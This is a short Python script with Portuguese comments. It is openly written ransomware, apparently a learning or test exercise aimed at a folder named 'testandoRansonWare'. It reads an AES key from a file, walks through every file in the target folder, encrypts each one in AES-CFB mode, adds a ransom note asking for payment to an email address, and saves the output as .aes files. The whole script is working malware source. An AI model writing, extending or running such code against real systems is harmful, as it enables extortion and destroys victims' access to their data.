from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
import secrets

def read_key_from_file(file_path):
    """Lê a chave de criptografia a partir de um arquivo."""
    with open(file_path, 'r') as f:
        return f.read().strip()

def encrypt_file(file_path, key, message):
    """Criptografa um arquivo e adiciona uma mensagem de resgate ao final dos dados criptografados."""
    # Gera um vetor de inicialização (IV) aleatório
    iv = secrets.token_bytes(16)
    
    # Configura o objeto Cipher com AES no modo CFB
    cipher = Cipher(algorithms.AES(bytes.fromhex(key)), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    
    # Lê os dados do arquivo original
    with open(file_path, 'rb') as f:
        data = f.read()
    
    # Criptografa os dados do arquivo
    encrypted_data = encryptor.update(data) + encryptor.finalize()
    
    # Adiciona a mensagem de resgate ao final dos dados criptografados
    message_bytes = message.encode('utf-8')
    encrypted_data_with_message = encrypted_data + b'\n' + message_bytes
    
    # Cria o caminho para o arquivo criptografado
    encrypted_file_path = file_path + '.aes'
    
    # Salva o IV e os dados criptografados no arquivo
    with open(encrypted_file_path, 'wb') as f:
        f.write(iv + encrypted_data_with_message)
    
    print(f"Arquivo criptografado salvo em: {encrypted_file_path}")

# Diretório onde os arquivos serão processados
target_directory = os.path.expanduser("~/testandoRansonWare")

# Caminho do arquivo que contém a chave de criptografia
key_file_path = os.path.join(os.path.expanduser("~"), 'ransonware', 'key.txt')

# Lê a chave de criptografia do arquivo
key = read_key_from_file(key_file_path)
print(f"Chave de criptografia: {key}")

# Mensagem de resgate que será adicionada aos arquivos criptografados
rescue_message = "Realize um pagamento de X RS e mande para o email tal para liberarmos sua decriptação."

# Itera sobre todos os arquivos no diretório alvo
for root, dirs, files in os.walk(target_directory):
    for file in files:
        file_path = os.path.join(root, file)
        # Criptografa apenas arquivos que não têm a extensão .aes
        if not file.endswith(".aes"):
            encrypt_file(file_path, key, rescue_message)
